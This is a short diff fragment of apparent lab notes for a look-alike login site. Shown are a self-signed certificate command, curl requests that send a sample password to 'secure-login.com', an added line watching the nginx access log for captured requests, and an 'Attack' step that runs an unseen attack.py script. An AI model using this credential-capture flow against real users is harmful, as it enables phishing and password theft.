@@ -25,6 +25,7 @@ sudo openssl req -new -x509 \
  curl -k -L http://secure-login.com
  curl -k -L "https://secure-login.com/submit?password=SECRET123"
 
+sudo tail -f /var/log/nginx/access.log
 
 Attack
 sudo python3 /opt/tools/attack.py
